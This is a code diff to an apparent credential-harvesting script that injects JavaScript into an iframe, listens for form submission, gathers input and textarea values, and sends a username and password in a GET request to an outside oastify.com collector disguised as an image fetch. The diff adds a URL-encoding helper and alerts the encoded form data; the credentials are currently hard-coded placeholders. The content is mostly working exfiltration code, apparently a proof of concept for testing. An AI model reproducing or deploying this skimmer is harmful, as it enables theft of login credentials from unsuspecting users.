@@ -16,6 +16,9 @@
         // Inject script to listen to form submission inside the iframe
         var script = doc.createElement('script');
         script.textContent = `
+            function objectToUrlEncodedString(data) {
+                return Object.keys(data).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])).join('&');
+            }
             function sendData(username, password) {
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
@@ -45,12 +48,13 @@
                     textareas.forEach(function(textarea) {
                         formData[textarea.name] = textarea.value;
                     });
+                    var urlEncodedString = objectToUrlEncodedString(formData);
                     
                     //var username = document.getElementById('control').value;
                     //var password = document.getElementById('control').value;
                     var username = '123';
                     var password = '456';
-                    alert(formData);
+                    alert(urlEncodedString);
                     sendData(username, password);
                 }
             });
